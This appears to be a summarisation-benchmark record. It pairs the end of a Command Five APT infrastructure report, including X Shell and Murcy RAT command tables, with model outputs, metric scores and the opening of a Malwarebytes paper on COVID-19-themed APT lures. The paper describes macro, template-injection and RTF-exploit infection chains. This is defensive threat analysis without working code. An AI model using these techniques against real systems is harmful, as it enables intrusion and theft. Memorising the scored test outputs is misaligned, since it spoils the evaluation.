HispasecSistemas.\t(2011,\tMay\t24).\tVirusTotal\t  Free\tOnline\tVirus, Malware and URL Scanner.RetrievedJanuary\t04, 2012,\tfromVirusTotal:\turl scan/file  Kaspersky\tLabZAO.\t(2010,\tJanuary\t12).\tBackdoor.Win32.Agent.anvj.RetrievedDecember09,\t2011,\tfrom Securelist:url Kurc,\tD.(2011,April17).\tEncyclopedia entry: TrojanDropper:Win32/Redsip.A\t  Learn more\tabout malware   Microsoft Malware Protection Center.\tRetrieved\tJanuary\t25,\t2012,from\tMicrosoftMalwareProtection Center: url AWin32%2FRedsip.A Lelli,\tA.\t(2010,\tMarch\t12).\tZero Day\tAttack\ton IE6\t  JS.Sykipot Doesn't Spare Retired Software.\tRetrievedFebruary 01,\t2012,from\tSymantecConnect\tCommunity:\turl day  attack ie6 jssykipot doesn t spare retired software MalwareDomains.\t(2012,January\t16). Malware Domains.\tRetrievedJanuary\t30,2012,\tfrom\tMalwareDomains: url McAfeeFoundationProfessionalServicesand\tMcAfeeLabs.\t(2011,February10).\tGlobal\tEnergy\tCyberattacks: \"Night Dragon\".RetrievedJune13,\t2011,\tfrom\tMcAfee:\turl  papers/wp global energy cyberattacks night dragon.pdf McAfeeInc.\t(2011,\tDecember22).\tBackdoor FCQ   Malware   McAfee\tLabs\tThreat Center.\tRetrievedFebruary02, 2012,\tfromMcAfeeLabsThreat\tCenter:url  intelligence/malware/default.aspx?id=670739 Mendoza,\tE.\t(2011). TROJ_INJECT.AMR\t| Low Risk | Trend Micro\tThreat Encyclopedia.Retrieved\tNovember21, 2011,\tfromTrend\tMicro:\turl  threats.trendmicro.com/malware/aspx?language=au&name=TROJ_INJECT.AMR Microsoft.\t(2007,\tDecember10).\tA\tdescription of Svchost.exe\tin Windows XP Professional\tEdition.Retrieved September07,\t2011,\tfrom\tMicrosoft\tSupport:url Microsoft\tCorporation.\t(2011,\tSeptember07).\tLocales\tand Languages (Windows).\tRetrievedJanuary24,2012, fromMicrosoft\tSoftwareDevelopment\tNetwork:\turl  us/library/dd318716.aspx Microsoft\tCorporation.\t(2011,\tSeptember07).\tOSVERSIONINFOEX structure.\tRetrieved\tJanuary\t17,2012,from Microsoft\tSoftwareDevelopment\tNetwork:\turl  us/library/windows/desktop/ms724833(v=vs.85).aspx Microsoft\tCorporation.\t(2011,\tSeptember07).\tSYSTEM_INFO structure.\tRetrieved\tJanuary\t24,\t2012,\tfrom\tMicrosoft MSDN:\turl us/library/windows/desktop/ms724958(v=vs.85).aspxCOPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE20OF\t29Mullaney,\tC.\t(2011,July\t30).\tBackdoor.Sogu Technical\tDetails\t| Symantec.\tRetrieved\tAugust\t18,\t2011,\tfrom url 073003 5345 99&tabid=2 pu.flower show.org.Retrieved\tJanuary\t28,2012,from\tContagio: url targeting experts on Japan.html Parkour,\tM.(2011,July\t14). Jul\t13 CVE 2010 2883 PDF Meeting Agenda with more Poison Ivy\twww.adv138mail.com url 13 cve 2010 2883 pdf meeting agenda.html Rasmussen,\tR.\t(2011). Practical\tUsage of Passive\tDNS\tMonitoring for\tE Crime Investigations.\tRetrieved\tJanuary04, 2011,\tfromurl Rasmussen.pdf rbls.\t(2011,November01).\tshenqi.travlman.com is not listed in any blacklists.\tRetrieved\tNovember01,\t2011,\tfrom rbls:\turl SafeZoneCast.\t(2011,\tAugust09).\tSafeZoneCast.\tRetrieved\tDecember30,\t2011,\tfrom url 0003NS Sandbox,\tG.(2010,December26).\tGFI Sandbox Malware Analysis Report: Trojan Downloader.Win32.Generic. Retrieved\tNovember29,\t2011,\tfrom\tGFI\tSandbox: shapeless.\t(n.d.).\tPoison Ivy 2.3.0\tDocumentation.Retrieved\tAugust\t17,2011,\tfrom\tPoisonIvy\t Remote AdministrationTool:\turl rat.com/dl.php?file=230docs SophosLtd.\t(2011,November25).\tDetailed Analysis   Troj/Agent UDR   Viruses and Spyware   Threat Analyses   Threat Center   Sophos.Retrieved\tDecember8,\t2011,\tfrom\tSophos:\turl  us/threat center/threat analyses/viruses and spyware/Troj~Agent UDR/detailed analysis.aspx SophosLtd.\t(2012,January\t19).\tDetailed Analysis   Troj/Bdoor BDM   Viruses and Spyware   Threat Analyses   Threat Center   Sophos.Retrieved\tJanuary\t31,\t2012,\tfromSophosThreat\tCenter: url us/threat center/threat analyses/viruses and spyware/Troj~BDoor  BDM/detailed analysis.aspx Sunbelt.\t(2009,\tOctober15). Sunbelt CWSandbox Malware Analysis Report: Backdoor.Win32.Pasur.Retrieved December19,\t2011,\tfrom\tSunbelt\tSecurity\tSandbox: Sunbelt\tSecurity.\t(2009,\tMay03).\tSunbelt CWSandbox Malware Analysis Report.\tRetrieved\tDecember01,2011, fromSunbelt\tSecurity\tSandbox: Sunbelt\tSecurity.\t(2009,\tOctober16).\tSunbelt CWSandbox Malware Analysis Report: Trojan.Win32.Sisproc. Retrieved\tDecember19,\t2011,\tfrom\tSunbeltSecurity\tSandbox: Sunbelt\tSecurity.\t(2010,\tDecember31). CWSandbox Report by MD5\tat Sunbelt Security.\tRetrievedOctober25, 2011,\tfromSunbelt\tSecurity: url e36e3c83f6a Sunbelt\tSecurity.\t(2010,\tMay12).\tGFI SandBox Analysis Report.\tRetrievedFebruary\t07,\t2012,from\tSunbelt January\t23,\t2012,\tfromGFI\tSandBox: SymantecCorporation.(2010,\tMarch\t11).\tBackdoor.Sykipot At Work.\tRetrieved\tFebruary\t02,\t2012,\tfrom\tSymantec Connect\tCommunity:\turl work SymantecCorporation.(2012,\tJanuary\t26).\tInsight into Sykipot Operations |\tSymantec Connect Community. Retrieved\tFebruary\t05,2012,\tfrom\tSymantecConnect\tCommunity: url sykipot operations 0 Telus.\t(2011,August\t03).\tBackdoor.Win32.Murcy.A\t  TELUS\tSecurity\tLabs.\tRetrieved\tDecember06,\t2011,\tfrom TELUS\tSecurityLabs:\turl 01 Thakur,\tV.\t(2011,\tDecember14).\tThe\tSykipot Attacks\t| Symantec\tConnect Community.Retrieved\tFebruary\t04,2012, fromSymantecConnectCommunity:\turl attacks Threat\tExpert\tLtd.(2010,\tJune15).\tThreatExpert Report.\tRetrieved\tJanuary\t11,\t2012,\tfromThreatExpert: url Threat\tExpert\tLtd.(2011,\tJuly\t26).\tThreatExpert Report: Backdoor.Win32.Agent.anvj, Trojan Downloader.Delphi. Retrieved\tDecember17,\t2011,\tfrom\tThreatExpert: Threat\tExpert\tLtd.(2011,\tNovember04). ThreatExpert report: Mal/Behav 027, Backdoor:Win32/Idicaf.gen!B. Retrieved\tNovember25,\t2011,\tfrom\tThreatExpert: Threat\tExpert\tLtd.(2011,\tOctober06).\tThreatExpert Report: Mal/Behav 027, Virus/Win32.Atraps.CK.\tRetrieved November21,2011,from\tThreatExpert: Threat\tExpert\tLtd.(2011,\tSeptember25).\tThreatExpert Report: TrojanDropper: Win32/Idicaf.C, Virus.Win32.Atraps.CK, Backdoor.Win32.Agent.bhxn.\tRetrieved\tDecember25,\t2011,\tfromThreatExpert: Threat\tExpert\tLtd.(2008,\tDecember18).\tThreatExpert Report: Mal/EncPk BL, Worm:Win32/Emerleox.J, Packed.Win32.Klone.af.\tRetrieved\tJanuary\t15,\t2012,\tfromThreatExpert: ThreatExpertLtd.\t(2010,\tMarch\t18).\tThreatExpert Report: Troj/Agent MSC, BinImage/Agent.283805.\tRetrieved January\t26,\t2012,\tfromThreatExpert: ThreatExpertLtd.\t(2011,\tDecember09).\tThreatExpert Report: Backdoor.Win32.Delf.abow, Trojan.Win32.CDur, Mal/Behav 058 Retrieved\tFebruary\t03,\t2012,\tfromThreatExpert: US CERT.\t(2011,\tMarch\t26).\tEarly Warning and Indicator\tNotice\t(EWIN) 11 077 01A\tUPDATE.\tRetrieved\tJanuary 06,\t2011,from\tIncidentPreventionand\tDetection:\tProtecting\tInformationSecurity\tof\tNationalBanks: url issuances/alerts/2011/alert 2011 4b.pdf Verisign.(2011).\tVerisign Authentication Services.\tRetrieved\tDecember29,2011,fromVerisignClass3\tCode Signing\tCertificateRevocationList:url 2009.crl COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE22OF\t29Ward,E.\t(2011,July\t31).\tBackdoor.Murcy\t|\tSymantec.\tRetrievedJanuary05,2011,from\tSymantec: url 080105 2030 99 Wikipedia.\t(n.d.).\tList of Intel microprocessors.\tRetrieved\tJanuary\t21,\t2012,from\tWikipedia,\tthefreeencyclopedia: url Wong,\tJ.\t(2011,\tAugust16).\tEncyclopedia entry:Backdoor.Win32/Thoper.A.\tRetrievedJanuary\t24,\t2012,\tfrom Microsoft\tMalwareProtectionCenter: url 32%2FThoper.A XTiger Crackersoftware.(2011,\tFebruary\t14).\tAll for\tDream RetrievedDecember23,\t2011,from\txdoors.net: url XTiger.\t(2010,April28).\tforum.xdoors.net.RetrievedDecember19,2011,from\txdoors.net: url XTiger.\t(2011,March\t16). forum.xdoors.net. Topic: X Door/X Shell\tfree download paused.\tRetrieved\tDecember27, 2011,\tfromforum.xdoors.net:\turl XTiger.\t(2011). Xdoors.net.\tRetrieved\tDecember23,2011,\tfrom\tAllfordream :\turl XTiger.\t(n.d.).\tX Shell.\tRetrieved\tDecember23,2011,from\tXDoors:url Shell.htmCOPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE23OF\t29OFFSET 155ANNEX ALENGTH\t(IN\tBYTES) 1FORMAT\tOF OSVERSIONINFOEX STRUCTUREMEMBERDESCRIPTION Structuresizeinbytes.\u20180x9C\u2019\t(156bytes). Anull terminated\tstring\tthatindicatesthelatestServicePack\tinstalled. Abitmask91thatidentifies\ttheproductsuites\tinstalled\tonthesystem. Producttypethatindicateswhetherthesystemisaworkstation(\u20180x01\u2019),adomaincontroller (\u20180x02\u2019)oranNTserverbutnotadomaincontroller(\u20180x03\u2019). Abytereserved\tforfutureuse.91ForadetaileddescriptionoftheproductsuitebitmaskrefertotheMicrosoftMSDNOSVERSIONINFOEXreferencepage.(Microsoft Corporation,2011)COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE24OF\t29ANNEX BFORMAT\tOF SYSTEM_INFO STRUCTURELENGTH\t(IN\tBYTES) Anumberindicating\ttheprocessorarchitectureoftheinstalled\tOS. Bytes\treservedforfutureuse. Pagesizeused\tand\tthegranularityofpageprotectionand\tcommitment. Minimumapplicationaddress.This\tis\tthelowestmemoryaddressthatapplicationsand DLLscanaccess. Maximumapplicationaddress.Thisis\tthehighestmemoryaddress\tthatapplications and\tDLLscanaccess. Amask\trepresenting\tthesetofprocessors\tconfiguredintothesystem. Granularityforthestarting\taddressatwhich\tvirtual\tmemorycanbeallocated. Thearchitecture dependentprocessorlevel. Thearchitecture dependentprocessorrevision.OFFSET 34COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE25OF\t29COMMAND rebindANNEX CSUMMARY OF\tX SHELL COMMANDSCOMMANDDESCRIPTION Servicecontrol\t(list/stop/start/view/installetc.). Starts\tacommand\tshell. Modifies\ttimestamponafile(datecreatedetc.). UninstallsRAT. Gets\tprocess\tmodulespecificinformation. Gets\thostmouseand\tkeyboard\tidletime. Opens\taURL\tinhiddenview. Opens\taURL\tinnormalview. Executes\taprograminhiddenview. Executes\taprograminnormal\tview. Compresses\tafileorfoldertoaCabfile. Gets\tcurrentControl\tHostIP\taddress\tand\tport. Uploads\tafiletotheControlHost. Downloads\tafilefromtheControl\tHostoraURL. Injectsapluginintoanotherprocess.(Thedefaultprocesstoinjectintois\t\u2018IEXPLORE.EXE\u2019.) Infects\taportableexecutablefile. Repairs\taportableexecutable\tfile. Displays\tinformationaboutinstalled\tantivirussoftware. TCP\tportforwarding\tand\tmapping. Displays\tcontrol\tproxy. Terminates\taTCP\tconnection. Controls\tCD ROM(open/close). Extracts\tsensitiveinformation. RebindsTCP\tporttogetpassword.COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE26OF\t29fport myplugDisplays\tportinformationwith\tprocesspath. Usercontrol\t(list/add/delete/\tcontrol\tetc.).Supports\tcloning\tandcloning\tcheck\tflood. Initiatesafloodattack. Terminal\tmanagementsettings\t(viewport/setport/start/stop). Attempts\ttofind\tcurrentuser\u2019sloginpassword. Aninterfacetothird partydeveloped\tplugins.COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE27OF\t29COMMANDCODE 0x8000ANNEX DSUMMARY OF\tMURCY COMMANDSCOMMANDDESCRIPTION Input/outputgenerated\tintheprocesswith\tanamedpipe. Getenvironmentstring.COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE28OF\t29COPYRIGHT\tNOTICECopyright\u00a9CommandFivePty\tLtd.\tAllrightsreserved.This\tdocument\tis\tprovidedby\tthecopyrightholdersunderthelicence that\tfollows.\tByobtaining,using,\tand/ordistributingthisdocumentyou agreethat\tyouhaveread,understood,\tand\tagreetothetermsand used\tinadvertisingorpublicity\trelatingtothisdocumentorits\tcontents withoutspecific,\tprior,\twrittenpermission. No\tpermissionisgivenforthisdocumenttobeused\tforcommercial purposes or as part\tof\tany\tcommercial activity\tor undertaking, including,\tbut\tnot\tlimited to,\tuse in or relating\tto advertising\tor publicity,\tand/oruseinsupportof,oraspartof,any\tpre salesorsales activities. No\tpermissionisgiventocreatemodifiedorderivativeworks.\tYou may\tdistributethis\tdocument\tinitsoriginalformfornon commercial purposesinaccordancewith\ttheothertermsand\tconditionsstated herein.\tCopyrighttitle willatalltimesremain withthecopyright holders.Allreferencedtrademarksremaintheproperty\tof\ttheirrespective owners.THIS DOCUMENT\tIS\tPROVIDED\t\u2018AS\tIS\u2019 FOR INFORMATIONAL INCLUDING BUT\tNOT\tLIMITED TO\tANY WARRANTY, EXPRESSORIMPLIED,OFMERCHANTABILITYORFITNESSFORA PARTICULAR PURPOSE; WARRANTY OF\tNON INFRINGEMENT,\tOR TITLE;\tNORANYWARRANTIES\tPERTAININGTO\tTHEACCURACYOR COMPLETENESSOF\tCONTENT. ANYOPINIONS\tEXPRESSED\tINTHISDOCUMENTMAYCHANGE WITHOUTNOTICEAND\tARENOTNECESSARILYTHECONSIDERED OPINIONS\tOF\tCOMMAND\tFIVE\tPTYLTD,ITSPARTNERS,\tEMPLOYEES, OR AFFILIATE\tORGANISATIONS.\tANY ADVICE OFFERED\tIN THIS DOCUMENT\tISOFFERED\tWITHOUTWARRANTYOFANYKIND.CommandFivePty\tLtd ABN:\t49\t149\t576\t670 url info@commandfive.com PAGE29OF\t29COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED. ", "generated_text": "the findings; an extensive investigation; command and control infrastructure; an advanced persistent threat; systems; the SK Communications hack; a hack; the theft; the personal details; 35 million; the malware; callback domains; IP addresses; DNS; the callback server; IP addresses; IP addresses; the C2 server; commands; data; the malware; the C2 server; DNS server; the callback domain; IP addresses; the DNS server; IP addresses; the attacker; this attack; the attacks; the RSA breach; the attacks; a variety; industries; the threat actor; a variety; the attacker; the victim; Analysis; Methods.", "ref_text": "<START-1>The paper presents an analysis of command and control infrastructure used by an advanced persistent threat (APT) group. It examines malicious software and protocols used to communicate with command and control servers. The findings link this activity to major targeted cyberattacks including the 2011 SK Communications hack, the 2011 RSA breach, and the NightDragon attacks on the energy sector. The analysis focuses on activity involving the domain \"alyac.org\" and its subdomains. Communications were observed between compromised computers and these domains using several protocols including LURK, XShell, Update?, Murcy, Oscar, BB, DB, and Qdigit. These protocols reveal information about the victims such as operating system details. The activity enables the attackers to remotely control the compromised systems. The report details how the observed activity is associated with various malware families and attacks. For example, the LURK and Update?/Oscar communications are tied to the Destory remote access trojan used in targeted intrusions. The Murcy malware has links to the 2011 RSA breach. Many of the domains and infrastructure have connections to the NightDragon and Sykipot campaigns. Insight is provided on the attackers' tactics, techniques and procedures. This includes configuring malware to use specified DNS servers, stealing browser cookies for potential session hijacking, using hidden communication channels, and more. Recommendations are made for security teams to monitor DNS traffic, be alert for high-frequency beaconing, and block activity that lacks preceding DNS lookups. Overall, the analysis demonstrates how examining lower-level technical indicators can reveal links between disparate intrusions. The findings illustrate the sophistication of some APT actors by highlighting their infrastructure sharing, malware reuse, and operational security practices. The report provides useful advice to help organizations defend against targeted attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.2, "t5/word/hint_hit_recall": 0.06521739130434782, "gpt3/lexical/rouge_rouge1": 0.456140350877193, "gpt3/lexical/rouge_rouge2": 0.15859030837004404, "gpt3/lexical/rouge_rougeL": 0.2719298245614035, "gpt3/lexical/rouge_rougeLsum": 0.2719298245614035, "gpt3_generated_text": ["This paper presents the findings of an extensive investigation into the command and control infrastructure used by an Advanced Persistent Threat. The research delves into technical details of malicious software, associated command and control protocols, and their modus operandi. The study identifies links between major targeted cyber attacks, such as the SK Communications hack, the RSA breach, and the NightDragon cyber attacks. The malware used in these attacks communicated with callback domains, which were resolved into IP addresses using the DNS protocol. The attackers infected computers with malware to gain access and exfiltrate data, highlighting the complex and well-planned nature of the attacks. The victims, including SK Communications, fell prey to the attackers' tactics, leading to the theft of personal details of up to 35 million individuals. The article warns against interacting with malicious IP addresses, domain names, and websites identified in the research. Overall, the study sheds light on the methods and tactics employed by threat actors in a variety of industries, emphasizing the need for robust cybersecurity measures to combat such attacks effectively."]}, {"split_name": "val", "sample_id": "val_87", "prompt_text": "Extract the keywords: WHITE PAPERAPTs and COVID-19: use the coronavirus as a lure Malwarebytes Threat Intelligence April 2020Table of contents Introduction: APT groups using COVID-19 3 Template injection 4 Malicious macros 10 Kimsuky 10 Konni (APT37) 11 Ocean Lotus 19 RTF exploit 20 Calypso Group 20 Chinese actor (Winnti) 21 Malicious LNK files 22 Mustang Panada 22 APT groups using COVID-19 Coronavirus (COVID-19) has become a global pandemic, upending economies, livelihoods, schools and hospital systems\u2014nearly every facet of everyday life has been touched. Such uncertainty and fear surrounding the virus and its impact represents a golden opportunity for threat actors to exploit the situation. By using social engineering tactics such as spam and spear phishing campaigns with COVID-19 as a lure, cybercriminals and threat actors increase the likelihood of successful attack.In this paper, we provide an overview of several different APT groups using coronavirus as a lure, as well as a description of their varied attack vectors. We categorize the APT groups according to the technique they used to send spam or phishing emails: Template injection, Malicious macros, RTF exploits, and malicious LNK files.From late January on, several cybercriminal and state- sponsored groups have been doing just that, using coronavirus-themed phishing emails as their infection vector to gain a foothold on victim machines. Just like the coronavirus itself, China was the first target of Advanced Persistent Threat ( APT) groups, and as the virus spread worldwide, so did the cyberattacks.Once their victims\u2019 attention was captured by social engineering, threat actors used various techniques to deploy malware, such as embedding macros in Microsoft documents attached to phishing emails or exploiting system or browser vulnerabilities to drop malicious software.APTs and COVID-19: How advanced persistent threats use the coronavirus as a lure3 33Template injection Template injection refers to a technique in which threat actors embed a script moniker in the lure document\u2014usually a Microsoft Office document\u2014that contains a link to a malicious Office template via an XML setting. Upon opening the document, the remote template is dropped and executed. Kimsuky and Gamaredon are examples of APTs using template injection.Kimsuky Kimsuky (also known as Velvet Chollima) is a North- Korean threat actor group that has been active since 2013 and is known to be behind the KHNP (Korea Hydro & Nuclear Power) cyber terrorism attacks of 20141. The group mainly targets Korean think tanks, DPRK/nuclear- related targets, and several US firms with the main goal of delivering malicious payloads to its targets and stealing web application accounts.Starting in early March 2020, Kimsuky began using spear phishing emails with COVID-19 in the subject line as its initial infection vector. The emails contain malicious documents weaponized with CVE-2017-01992. This vulnerability allows remote code execution by exploiting a flaw in the Microsoft Office OLE interface to deliver malware.Upon opening the document, a prompt asks victims to \u201cenable content\u201d to show information about the coronavirus.Figure 2: Malcious document after enabling contentAfter enabaling the content, a script moniker \u201cin word/_rels/setting[.]xml[.]rels\u201d is triggered and drops a Microsoft document template called web.dotm from the following url:url Templetes/normal.php?name=webFigure 1: Malicious document used as a lureFigure 3: setting.xml.rels content4The \u201cweb.dotm\u201d has an embedded macro which is designed to target Mac users (Figure 4). This macro also runs on Windows OS, however, it only executes its main malicious functionality on a Mac. There is an \u201cIf statement\u201d that checks the operating system and executes a remote Python script called \u201cSecured.APP\u201d.Figure 4: Malicious macro embedded in web.dotmFigure 5 shows the content of \u201cSecured.APP\u201d, which executes the second stage Python script. Based on the directory information provided in this script, it seems it is targeting users with Microsoft Office version 2016 or earlier.Figure 5: Secured.APP5The second payload, as depicted in Figure 7, is spyware that collects information by running several commands and sending the collected data to its C&C server. The main function is \u201cSpyLoop\u201d, which collects and sends device/user information in an infinite while loop.The list of collected information, stored in separate files (Figure 6), is as follows: \u2022 Architecture info \u2022 System infoExternal network info Firewall\u2022 Apple Pay Language and region List of running processes List of installed Applications List of files in Documents/Downloads/Desktop directory List of volumes List of users\u2022 \u2022Figure 6: Content of collected informationThe directory is then compressed with a password (\u201cdoxujoijcs0qei09213@#$@\u201d) and uploaded as a zip file in an http request as shown in Figure 7.6Figure 7: Second Python scriptThe next function in the loop is \u201cExecNewCommand\u201d, which is likely used to download additional content. It then sleeps for five minutes and repeats the same process. At time of writing, it only responded with a \u201c200 OK\u201d.APTs and COVID-19: How advanced persistent threats use the coronavirus as a lure7 77Gamaredon Gamaredon is a Russian APT that primarily performs cyber espionage operations against Ukrainian military forces, as well as individuals related to the Ukrainian government. Gamaredon has been active since 2013 and often uses spear phishing as its initial infection vector.Between March 23 and 25, Gamaredon sent phishing emails using the COVID-19 theme and employed remote template injection within their lure, a Microsoft Word document written in Russian. (Figure 8).Upon opening the document, a remote template is dropped from the link provided in the XML setting (Figure 9).We were not able to retrieve this template at time of publishing, but found other similar templates used by this APT days before this campaign and realized they are using similar malicious macros. Figure 10 shows an example of such a macro.Instead of executing the malicious behavior upon opening the document (using the \u201cauto_open\u201d function), the malicious macro in this document is executed in the \u201cDocument_close\u201d function. This could be to bypass dynamic analysis if the document is not closed before the sandbox times out.The macro collects the computer name, home drive\u2019s label/serial number, and BIOS information (using WMI) and sends it to a hardcoded C2 server with this format:url BiosVersionInfoFigure 9: Template injectionFigure 8: Lure documentAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure8 88It then creates a VBS script in the %APPDATA% directory and makes it persistent by copying it into the startup directory. In addition to the mentioned items, the script also collects keyboard layout and country code and checks whether Process explorer or Wireshark are running on the system.Figure 10: Macro embedded in templateThe APT group then drops its custom backdoor \u201cPterodo\u201d that is capable of downloading other malware variants and collecting sensitive information3.9Malicious MacrosEmbedding malicious macros is the most popular method of infection used by APTs. In this attack vector, a macro is embedded in the lure document that will be activated upon its opening. In the following sections, we look at APTs using this method in their COVID-19 lure.Kimsuky In the previous section, we mentioned that Kimsuky is using template injection to infect Mac users. We also observed this actor using COVID-19-themed malicious macros to target Windows users mostly in South Korea4. (Figure 11):Figure 11: Malicious document targeting Windows usersAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure10 1010The malicious macro is obfuscated, as shown in Figure 12:Figure 12: Malicious obfuscated macroAfter de-obfuscating the script, we can see the value stored in the content variable as:This uses \u201cmshta\u201d to execute a malicious search.hta file from its server. The content variable is then executed by Wscript. The \u201cSearch.hta\u201d contains a script that downloads another script. The downloaded script is spyware that collects sensitive information, such as IP addresses, usernames, list of processes, RDP information, and Outlook information and sends it back to the server.Figure 13 shows the lure document, named \u201cKeep an eye on North Korean cyber.doc\u201d:Konni (APT37) Konni is a North Korean APT that has been active since 2012 and is known to target South Korean organizations in the chemicals, electronics, manufacturing, aerospace, automotive, and healthcare industries. In 2017, the group expanded its operations, targeting organizations in several other countries, such as the US, Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and countries in the Middle East. Recently, researchers found several communalities between this APT and Kimsuky, showing there is a close tie between these two groups5.Konni is known to use spear phishing emails, strategic web compromises, and torrent file-sharing sites to compromise its victims. In mid-March, they began sending spear phishes with COVID-19 warnings, ironically advising readers to watch out for North Korean cybercrime spikes related to the spread of the virus.Figure 13: Lure document11The embedded macro in this document includes an encrypted executable code that is XOR decoded and stored in the \u201cC\\Users\\UserName\\\u201d directory (Figure 14). The dropped executable is a downloader for their popular Konni Remote Access Trojan (RAT) downloaded from6:url 14: Embedded macro12APT36 APT36 is another threat group that has employed macro-embedded COVID-19 themes in their recent campaigns. The group is believed to be Pakistani state-sponsored, mainly targeting the defense, embassies, and government of India.7 Their coronavirus attacks began on March 12 and included phishing emails with attached malicious documents, which dropped Crimson RAT payloads on victim machines. Patchwork Patchwork, also known as Dropping Elephant, Chinastrats, APT-C-09, and Quilted Tiger, is an Indian threat actor that has been active since 2013. The primary targets of this APT are organizations related to diplomatic and government agencies in China, Japan, the Middle East, the UK, the US, Bangladesh, Sri Lanka, and Pakistan. Patchwork mainly uses spear phishing methods to gain access to victims\u2019 machines.In early February, Patchwork began sending phishing emails with a COVID-19 theme, using malicious Excel documents to target Chinese organizations (Figure 15).Figure 15: Lure documentAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure1313The embedded macro (Figure 17) is simple: It downloads a script from the URL embedded as a formula in column \u201cX\u201d, row \u201c100\u201d. (Figure 16).Figure 16: Url embedded in the cellFigure 17: MacroThe downloaded Scriptlet \u201cwindow.scr\u201d (Figure 18) is responsible for dropping and executing another payload, which is a custom backdoor developed by the actor.Figure 18 window.scr14Hades Hades is the APT group behind the attack against the Pyeongchang Winter Olympics. Evidence suggests that this group is connected to the well-known Russian threat actor APT288.In their recent campaign called Tricky Mouse, Hades targeted Ukrainian users using COVID-19 lures9, 10. The attack started by sending a macro-embedded document to victims (Figure 19).The embedded macro (Figure 20) decodes and drops a RAT executable into the victim\u2019s machine.Figure 19: Hades lure documentFigure 20: Embedded macro15The RAT is dropped in the local user directory as \u201cconhost.exe\u201d. That RAT is a .NET executable obfuscated by \u201cEazfuscator.net\u201d (Figure 21):Figure 21: Hades RATAfter de-obfuscation. we saw that the RAT had several functionalities, such as collecting system and user information, taking screenshots, and logging keystrokes.The \u201cKdaapk\u201d module is responsible for performing C&C communications. The C&C URL is hardcoded within this module as you can see in Figure 22:Figure 22: Hades RAT after deobfuscation16TA505 TA505 is an APT group that started its activity by distributing the Dridex banking Trojan on mass scale in 201411. The group is considered unique, as it\u2019s a financially-motivated team of threat actors that uses a wide variety of malware families.Starting on March 9th, TA505 used malicious macros in their COVID-19 themed documents, which included Microsoft Excel spreadsheets. Figure 23 show such a document after enabling its content:As you can see in Figure 24, upon opening the document, a progress bar dialog box pops up (UserForm1_show). The dialog box is used to confuse the user while the main malicious functionality is located in the popped-up dialog box activate function (Figure 25).Figure 23: Lure documentFigure 24: Embedded macroAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure17 1717When the dialog box is popped up, the \u201cUserForm_ Activate()\u201d function is executed, which calls \u201cNlgebredneh()\u201d function:Figure 25: Trigger function of the dialog boxThe \u201cNlgebredneh()\u201d function drops \u201cpaper.xls\u201d in the \u201c%APPDATA%\u201d temp directory and extracts \u201coleobject1. bin\u201d from \u201cpaper.xls\u201d. In the next step, it decrypts the content of \u201coleobject1.bin\u201d into \u201creinforce.dll\u201d in the \u201c%APPDATA%/Microsoft/Windows/Templates\u201d directory. Finally, it executes the DLL file.Figure 26: The \u201cNlgebredneh\u201d functionThe DLL file is a small downloader that decrypts the next payload into memory. The downloader drops additional malware families associated with TA505, such as banking Trojans and RATs.18TA542 TA542 (Mummy Spider) is a Russian-speaking threat actor group behind the distribution of Emotet, which was first seen in the wild in 201412. At first, TA542 used modules from the Feodo banking Trojan, but over time developed their malware with modular architecture adding new capabilities.Since the emergence of COVID-19, TA542 has started using coronavirus themes in various email distribution campaigns. Malicious documents distributed by the actor have embedded macros that act as a downloader for Emotet malware13. Bitter Bitter is suspected to be a south Asian APT group targeting Pakistan and China since 201514. According to other security researchers, this group has also used COVID-19 themes to target China15. Macro-embedded documents distributed by this group download and drop a variant of its custom RAT that has been written in .Net. Unfortunately, we were not able to retrieve any sample related to this campaign.Ocean Lotus APT32 (Ocean lotus, Sea Lotus) is a Vietnamese APT that has been active since 2014.The group has targeted private sectors as well as governments and journalists from Australia, Brunei, Cambodia, China, Germany, Indonesia, Laos, Malaysia, Myanmar, Philippines, Singapore, Thailand, the US, and Vietnam. Ocean Lotus has used strategic web compromises and spear phishing to gain foothold into victims\u2019 machines16.Ocean Lotus also used malicious macro-embedded documents with COVID-19 themes to target China, starting February 19. In this attack, the malicious document dropped the \u201cDenis\u201d Trojan, a malware family that has been developed by this group17.APTs and COVID-19: How advanced persistent threats use the coronavirus as a lure19 1919RTF exploit RTF is a flexible text format that was introduced by Microsoft a long time ago. The flexibility of embedding any object type within makes RTF files vulnerable to many OLE objects related vulnerabilities. Several threat actors, especially Chinese ones, use RTF files in their campaigns. Among them are the Calypso group and Winnti threat actors who have used RTF files in their COVID-19 campaigns.In this campaign, the RTF file exploits the equation editor vulnerability to drop \u201cintel.wll\u201d into the \u201cAppData/ Roaming/Microsoft/Word/STARTUP/\u201d directory (Figure 27). \u201cintel.wll\u201d is then executed each time the Microsoft Word application is launched. This DLL downloads additional payloads, including a backdoor with several capabilities, such as taking screen shots, executing new processes, or collecting system information.Calypso Group Calypso is a Chinese APT group that has been performing cyber espionage operations since 201618, 19. The group has targeted governments in Brazil, India, Kazakhstan, Russia, Thailand, Belarus, Mongolia, and Turkey.In the new campaign, called Vicious Panada, Calypso Group has targeted the Mongolian public sector by sending malicious RTF files to victims disguised as COVID-19 related documents20.The RTF file has been weaponized with the Royal Road RTF weaponization tool. The tool is known to be used by several Chinese actors and has the capability to embed objects within RTF files that exploit vulnerabilities related to Microsoft Equation Editor. (CVE-2017-11882, CVE-2018-0798, CVE-2018-0802)21.Figure 28: 